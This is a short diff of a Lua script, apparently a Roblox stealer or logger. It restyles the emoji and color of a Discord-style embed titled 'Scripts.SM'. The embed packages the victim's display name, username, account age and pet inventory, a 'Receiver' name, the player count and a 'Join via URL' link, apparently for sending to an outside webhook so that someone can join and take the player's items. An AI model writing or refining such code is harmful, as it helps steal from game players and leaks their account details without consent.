@@ -379,25 +379,25 @@ local payload = {
     embeds = {{
         title = "Scripts.SM",
         description = "⠀\n<:faq_badge:1436328022910435370> **Status:** `Unknown`\n> Failed to Fetch Status.\n⠀",
-        color = 3447003,
+        color = 3394815,
         fields = {
             {
-                name = "<:players:1365290081937526834> **Display Name**",
+                name = "<:emoji_4:1402578195294982156> **Display Name**",
                 value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
                 inline = true
             },
             {
-                name = "<:game:1365295942504550410> **Username**",
+                name = "<:emoji_2:1402577600060325910> **Username**",
                 value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
                 inline = true
             },
             {
-                name = "<:time:1365991843011100713> **Account Age**",
+                name = "<:emoji_7:1402587793909223530> **Account Age**",
                 value = "```" .. Players.LocalPlayer.AccountAge .. " Days```",
                 inline = true
             },
             {
-                name = "<:folder:1365290079081205844> **Receiver**",
+                name = "<:emoji_3:1402578008245801086> **Receiver**",
                 value = "```" .. (Username or "Unknown") .. "```",
                 inline = true
             },
@@ -407,12 +407,12 @@ local payload = {
                 inline = true
             },
             {
-                name = "<:events:1365290073767022693> **Player Count**",
+                name = "<:stats:1436336068461985824> **Player Count**",
                 value = "```" .. playerCount .. " / 5```",
                 inline = true
             },
             {
-                name = "<:pack:1365295947281862656> **Inventory**",
+                name = "<:money:1436335320437096508> **Inventory**",
                 value = "```" .. (petString ~= "Nothing" and petString or "No pets found") .. "```",
                 inline = false
             },
@@ -422,7 +422,7 @@ local payload = {
                 inline = false
             },
             {
-                name = "<:location:1365290076279541791> **Join via URL**",
+                name = "<:loc:1436344006421385309> **Join via URL**",
                 value = "[ **Click Here to Join!**](" .. joinUrl .. ")",
                 inline = false
             }
